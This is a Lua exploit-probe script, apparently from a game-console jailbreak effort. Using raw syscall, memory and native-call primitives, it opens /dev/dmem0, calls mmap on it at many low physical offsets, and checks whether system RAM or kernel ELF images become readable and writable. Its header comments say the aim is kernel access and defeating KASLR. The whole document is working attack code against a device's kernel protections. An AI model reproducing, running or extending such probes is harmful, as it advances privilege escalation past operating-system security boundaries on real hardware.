-- CRASH_CLASS: LOW
-- PROBE 547a: Can dmem0 map physical addresses below the GPU pool?
--
-- 545h confirmed: mmap(477) + /dev/dmem0 fd + phys_from_AllocDM works.
-- AllocDM returns phys in GPU pool (0x100000000-0x150000000).
-- Kernel lives in system RAM (lower physical addresses).
--
-- Test: mmap dmem0 with offset=0, offset=0x1000000, etc.
-- If the device driver doesn't validate the offset range,
-- we get physical memory R/W over system RAM → kernel access → KASLR defeat.

print("=== 547a: dmem0 LOW PHYS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end

local sc_mmap = make_syscall(477)
local sc_open = make_syscall(5)
local sc_munmap = make_syscall(73)

-- Open /dev/dmem0
local path_buf = memory.alloc(16)
wd(path_buf, 0x7665642F)               -- "/dev"
wd(path_buf + 4, 0x656D642F)           -- "/dme"
wd(path_buf + 8, 0x00306D)             -- "m0\0"

local ok_o, fd_v = pcall(function()
    return sc_open(uint64(path_buf), uint64(2), uint64(0))
end)
local dmem_fd = ok_o and to_num(fd_v) or -1
print("dmem0 fd=" .. dmem_fd)
if dmem_fd < 0 then print("FATAL: can't open dmem0"); return end

-- Also get a valid GPU phys for comparison
local alloc_fn
if libkernel_base then
    alloc_fn = libkernel_base + uint64(0x17EF0)
else
    local info = memory.alloc(0x200)
    for off = 0, 0x1FC, 4 do wd(info+off, 0) end
    wd(info, 0x160)
    pcall(function() make_syscall(593)(uint64(0x2001), info) end)
    local lk_lo = rd(info + 0x108) or 0
    local lk_hi = rd(info + 0x10C) or 0
    local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
    alloc_fn = lk + uint64(0x17EF0)
    print("LK=" .. q(lk))
end

local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local gpu_phys = rq(phys_out)
print("GPU phys=" .. q(gpu_phys))

-- Test offsets: system RAM range, then GPU pool for comparison
local MAP_SHARED = 0x1
local MAP_FIXED = 0x10
local base_va = uint64("0x880000000")

local offsets = {
    {uint64(0),              "phys=0 (RAM start)"},
    {uint64(0x1000),         "phys=0x1000 (page 1)"},
    {uint64(0x100000),       "phys=1MB"},
    {uint64(0x1000000),      "phys=16MB"},
    {uint64(0x10000000),     "phys=256MB"},
    {uint64(0x40000000),     "phys=1GB"},
    {uint64(0x80000000),     "phys=2GB"},
    {uint64("0xC0000000"),   "phys=3GB"},
    {uint64("0xFE000000"),   "phys=~4GB (just below GPU pool)"},
    {uint64("0x100000000"),  "phys=4GB (GPU pool start)"},
    {gpu_phys,               "phys=AllocDM (known good)"},
}

for idx, entry in ipairs(offsets) do
    local offset, label = entry[1], entry[2]
    local va = base_va + uint64((idx - 1) * 0x4000)

    print("")
    print("[" .. idx .. "] " .. label)
    print("  VA=" .. q(va) .. " offset=" .. q(offset))

    local ok_m, rv_m = pcall(function()
        return sc_mmap(va, uint64(0x4000), uint64(0x33),
            uint64(MAP_SHARED + MAP_FIXED), uint64(dmem_fd), offset)
    end)

    if not ok_m then
        print("  PCALL FAIL")
    else
        local n = to_num(rv_m)
        if n < 0 then n = n + 0x100000000 end
        print(string.format("  rv=0x%X", n))

        if n ~= 0xFFFFFFFF and n ~= 0 then
            print("  MAPPED!")
            -- Read first 32 bytes
            local vals = {}
            for off = 0, 28, 4 do
                local v = rd(va + off)
                if v then
                    if v < 0 then v = v + 0x100000000 end
                    vals[#vals+1] = string.format("%08X", v)
                else
                    vals[#vals+1] = "FAULT___"
                    break
                end
            end
            print("  DATA: " .. table.concat(vals, " "))

            -- Check for ELF header (0x7F454C46 = "\x7fELF" LE = 0x464C457F)
            local d0 = rd(va)
            if d0 then
                if d0 < 0 then d0 = d0 + 0x100000000 end
                if d0 == 0x464C457F then
                    print("  *** ELF HEADER FOUND ***")
                end
            end

            -- Unmap to reuse VA space
            pcall(function() sc_munmap(va, uint64(0x4000)) end)
        else
            print("  REJECTED (-1)")
        end
    end
end

-- If any low offset worked, do a wider scan
print("")
print("=== 547a DONE ===")
